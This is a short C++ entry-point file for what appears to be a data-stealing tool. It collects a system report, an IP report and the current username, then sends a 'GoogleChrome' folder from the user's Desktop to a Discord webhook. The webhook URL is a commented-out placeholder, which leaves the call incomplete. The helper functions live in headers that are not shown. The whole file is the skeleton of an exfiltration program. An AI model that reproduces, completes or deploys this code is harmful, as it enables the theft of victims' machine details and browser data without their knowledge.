#include"UserInfo.h"
#include "SystemReport.h"
#include "CreateFolder.h"
#include "IPReport.h"
#include <iostream>
#include "FolderSender.h"


int main()
{
    CreateFolderAtUserLocation();
    GenerateSystemReport();
    WriteIPReport();

    std::wstring username = GetCurrentUsername();

    std::wstring chromeFolder =
        L"C:\\Users\\" + username + L"\\Desktop\\GoogleChrome\\";

    SendFolderToDiscord(
        chromeFolder,
/*        L"DISCORD Webhook URL goes here "*/
    );


    return 0;
}
